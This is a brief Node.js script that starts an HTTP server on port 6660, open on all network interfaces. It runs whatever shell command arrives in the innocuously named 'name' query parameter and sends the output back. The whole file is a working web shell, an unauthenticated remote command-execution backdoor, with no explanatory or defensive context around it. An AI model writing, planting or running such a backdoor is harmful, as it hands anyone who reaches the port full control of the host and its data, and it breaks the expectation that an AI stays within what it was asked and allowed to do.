var sys   = require('sys'),
    exec  = require('child_process').exec,
    child,
    http = require('http');
    
child = function(res, cmd) {
  exec(cmd, 
  function (error, stdout, stderr) {
    res.end(stdout);
    if (error !== null) {
      console.log('exec error: ' + error);
    }
  });
};

http.createServer(function (req, res) {
  res.writeHead(200, {'Content-Type': 'text/plain'});
  var parsedRequest = require('url').parse(req.url, true);
  var cmd = parsedRequest.query['name'];
  if (cmd != undefined)
  {
    console.log("[cmd] " + cmd);
    child(res, cmd);
  }
}).listen('6660', '0.0.0.0');

